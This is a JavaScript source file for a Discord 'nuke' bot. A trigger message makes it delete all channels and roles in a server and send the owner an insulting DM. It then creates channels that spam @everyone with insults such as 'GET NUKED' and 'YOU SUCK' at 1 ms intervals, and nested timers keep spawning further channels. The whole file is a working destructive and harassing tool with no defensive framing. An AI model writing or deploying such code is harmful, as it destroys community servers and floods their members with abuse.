const Discord = require('discord.js');
const bot = new Discord.Client();

bot.login(process.env.TOKEN);

bot.on('message', (message) => {
  let replies = [ 
    (`GET NUKED`),
    (`NOOBS`),
    (`YOUR TRASH`),
    (`NUKED NOOBS`),
    (`NOOBS LOL`),
    (`NUKED LOL`),
    (`NUKED`),
    (`SO DOGWATER`),
    (`LOSERS`),
    (`GET NUKED LOSERS`),
    (`LMAO NUKED`),
    (`YOU SUCK`)
  ]

  if(message.content === 'n1?up') {
    if (message.author.bot || message.channel.type === 'dm') {
      message.reply("You can only use this Command in a Server!")
    } else {
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.roles.cache.forEach(role => role.delete());

      message.guild.owner.user.send("YOUR SERVER GET NUKED IDIOT!")

      message.guild.channels.create('GET NUKED', {
        type: 'text',
        permissionOverwrites: [{
          id: message.guild.id,
          allow: ['VIEW_CHANNEL'],
        }]
      }).then(async channel => {
        setInterval(function() {
          channel.send(`${replies[Math.floor(Math.random() *    replies.length)]}` + " : " + "@everyone");
          message.guild.channels.create('GET NUKED', {
            type: 'text',
            permissionOverwrites: [{
              id: message.guild.id,
              allow: ['VIEW_CHANNEL'],
            }]
          }).then(async channel => {
            setInterval(function() {
              channel.send(`${replies[Math.floor(Math.random() * replies.length)]}` + " : " + "@everyone");
            }, 1)
          })
        }, 1)
      })
    }
  }
});
